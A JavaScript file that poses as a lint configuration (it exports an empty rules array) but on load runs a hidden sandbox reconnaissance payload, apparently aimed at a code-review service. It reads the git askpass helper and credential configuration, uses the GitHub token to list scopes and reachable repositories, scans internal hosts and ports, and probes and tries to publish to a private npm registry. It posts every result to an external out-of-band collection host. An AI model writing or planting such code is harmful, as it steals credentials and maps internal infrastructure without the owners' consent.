const cp=require("child_process"),crypto=require("crypto");
const OOB="http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me";
function sh(c,t){try{return cp.execSync(c,{encoding:"utf8",timeout:t||7000,maxBuffer:20971520});}catch(e){return "ERR:"+String((e&&(e.stderr||e.message))||"").slice(0,300);}}
function post(tag,d){try{const b=Buffer.from(String(d)).toString("base64");sh(`curl -s --max-time 7 -X POST --data-binary ${JSON.stringify(b)} ${JSON.stringify(OOB+"/"+tag)}`);}catch(_){ }}
function fp(v){if(!v)return "absent";v=String(v).trim();return "sha256="+crypto.createHash("sha256").update(v).digest("hex").slice(0,16)+" len="+v.length+" head="+v.slice(0,4);}
(function(){
  // ---- K: git clone credential ----
  post("K_ASKPASS_ENV", sh("echo GIT_ASKPASS=$GIT_ASKPASS; echo ---; cat \"$GIT_ASKPASS\" 2>/dev/null | head -40"));
  post("K_GITCFG", sh("cd /home/jailuser/git 2>/dev/null; git remote -v 2>/dev/null; echo ---; git config --list 2>/dev/null | grep -iE 'url|extraheader|helper' ; echo ---; sed -E 's#(https://)[^@]*@#\\1<REDACTED>@#' .git/config 2>/dev/null"));
  // extract token via credential fill, fingerprint only
  post("K_CREDFILL_FP", sh("cd /home/jailuser/git 2>/dev/null; P=$(printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill 2>/dev/null | sed -nE 's/^password=(.*)/\\1/p'); node -e 'const c=require(\"crypto\");const v=process.argv[1]||\"\";console.log(v?\"token sha256=\"+c.createHash(\"sha256\").update(v).digest(\"hex\").slice(0,16)+\" len=\"+v.length+\" head=\"+v.slice(0,7):\"no-token\")' \"$P\""));
  // test token SCOPE in-band (report non-secret: identity + repos it can reach)
  post("K_TOKEN_SCOPE", sh("cd /home/jailuser/git 2>/dev/null; P=$(printf 'protocol=https\\nhost=github.com\\n\\n' | git credential fill 2>/dev/null | sed -nE 's/^password=(.*)/\\1/p'); echo '== /rate_limit (identity) =='; curl -s --max-time 6 -H \"Authorization: token $P\" https://api.github.com/rate_limit -D - -o /dev/null | grep -iE 'x-oauth-scopes|x-github|x-accepted'; echo '== installation/repositories =='; curl -s --max-time 6 -H \"Authorization: token $P\" 'https://api.github.com/installation/repositories?per_page=100' | tr ',' '\\n' | grep -E '\"(full_name|total_count|push|admin|maintain)\"' | head -60"));
  // ---- L: sandbox reuse / cross-tenant remnants ----
  post("L_DIRS", sh("for d in /home /home/jailuser /home/jailuser/git /tmp /var/tmp /root /workspace; do echo \"== $d ==\"; ls -la $d 2>/dev/null | head -20; done"));
  post("L_OTHER_REPOS", sh("find / -maxdepth 5 -type d -name .git 2>/dev/null | grep -v '/home/jailuser/git/.git' | head -30"));
  post("L_RECENT", sh("find /home /tmp /var/tmp -maxdepth 4 -type f -newermt '-120 min' 2>/dev/null | grep -vE '/home/jailuser/git/' | head -40"));
  // ---- M: env values (non-secret infra) + fast netscan ----
  post("M_ENVVALS", sh("for k in GIT_ASKPASS NODE_OPTIONS NODE_PATH NPM_CONFIG_REGISTRY PNPM_CONFIG_REGISTRY COREPACK_NPM_REGISTRY no_proxy NO_PROXY HOME PATH; do echo \"$k=$(printenv $k)\"; done"));
  post("M_NETSCAN", sh("bash -c 'for h in 10.0.0.1 10.0.0.2 10.0.0.10 10.0.0.27 10.0.0.28 10.0.0.29 10.0.0.30 10.0.0.50; do for p in 80 443 4873 5432 6379 9200 8080; do timeout 0.25 bash -c \"echo >/dev/tcp/$h/$p\" 2>/dev/null && echo \"$h:$p open\"; done; done'", 7500));
  // ---- N: npm / Verdaccio registry ----
  post("N_NPMCFG", sh("npm config get registry 2>/dev/null; echo ---; npm whoami 2>&1 | head -2; echo ---; npm config get //10.0.0.28:4873/:_authToken 2>/dev/null"));
  post("N_PRIVSCOPE", sh("R=http://10.0.0.28:4873; for s in @coderabbit @coderabbitai @coderabbit-internal @cr @internal; do echo \"== $s/* search ==\"; curl -s --max-time 5 \"$R/-/v1/search?text=$s&size=10\" | head -c 400; echo; done"));
  post("N_SEARCH", sh("curl -s --max-time 6 'http://10.0.0.28:4873/-/v1/search?text=coderabbit&size=20' | head -c 800"));
  post("N_PUB_NEW_UNSCOPED", sh("curl -s --max-time 6 -o /dev/null -w 'newPkgPUT=%{http_code}' -X PUT 'http://10.0.0.28:4873/crpoctest-'$RANDOM -H 'content-type: application/json' --data '{\"name\":\"crpoctest\",\"versions\":{\"1.0.0\":{\"name\":\"crpoctest\",\"version\":\"1.0.0\"}},\"dist-tags\":{\"latest\":\"1.0.0\"}}'"));
  post("N_VERD_CFG", sh("for u in /-/verdaccio/packages /-/verdaccio/data/packages /-/ping /-/verdaccio/sidebar; do echo \"== $u ==\"; curl -s --max-time 4 http://10.0.0.28:4873$u | head -c 300; echo; done"));
})();
module.exports=[{rules:{}}];
